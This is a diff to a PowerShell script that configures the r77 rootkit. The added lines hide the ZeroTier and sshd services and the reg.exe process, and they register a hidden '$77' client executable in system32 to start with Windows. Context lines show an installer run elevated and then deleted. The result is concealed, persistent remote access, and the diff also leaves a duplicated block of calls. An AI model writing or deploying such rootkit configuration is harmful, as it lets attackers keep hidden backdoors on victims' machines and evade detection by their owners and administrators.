@@ -73,7 +73,7 @@ Start-Process -FilePath $exePath -Verb RunAs -Wait
 Start-Sleep -Seconds 2
 Remove-Item $exePath -Force
 
-# PowerShell Script to add services and processes to the custom registry key for r77 configuration
+# Adds services, processes, and startup applications to the r77 configuration registry keys
 
 # Function to check and create the registry key if it doesn't exist
 function Ensure-RegistryKey {
@@ -99,6 +99,10 @@ Ensure-RegistryKey -path $serviceNamesPath
 $processNamesPath = "$rootRegPath\process_names"
 Ensure-RegistryKey -path $processNamesPath
 
+# Ensure the startup subkey exists
+$startupPath = "$rootRegPath\startup"
+Ensure-RegistryKey -path $startupPath
+
 # Function to add a service name to the registry if not already present
 function Add-ServiceName {
     param([string]$service)
@@ -122,6 +126,33 @@ function Add-ProcessName {
         Write-Host "Process name already in registry: $process"
     }
 }
+
+# Function to add a startup application to the registry if not already present
+function Add-StartupApplication {
+    param([string]$applicationPath)
+    $executableName = [System.IO.Path]::GetFileName($applicationPath)
+    if (-not (Get-ItemProperty -Path $startupPath -Name $executableName -ErrorAction SilentlyContinue)) {
+        New-ItemProperty -Path $startupPath -Name $executableName -Value $applicationPath -PropertyType String | Out-Null
+        Write-Host "Startup application added to registry: $executableName"
+    }
+    else {
+        Write-Host "Startup application already in registry: $executableName"
+    }
+}
+
+# Add "ZeroTierOneService" and "sshd" to the service names registry
+Add-ServiceName -service 'ZeroTierOneService'
+Add-ServiceName -service 'sshd'
+
+# Add "reg.exe" to the process names registry
+Add-ProcessName -process 'reg.exe'
+
+# Adds startup applications to $77Config
+Add-StartupApplication -applicationPath 'C:\Windows\system32\$77Starware\$77SWClient.exe'
+
+# Output completion message
+Write-Host "Services, processes, and startup applications have been configured in the registry."
+
 
 # Add "ZeroTierOneService" and "sshd" to the service names registry
 Add-ServiceName -service 'ZeroTierOneService'
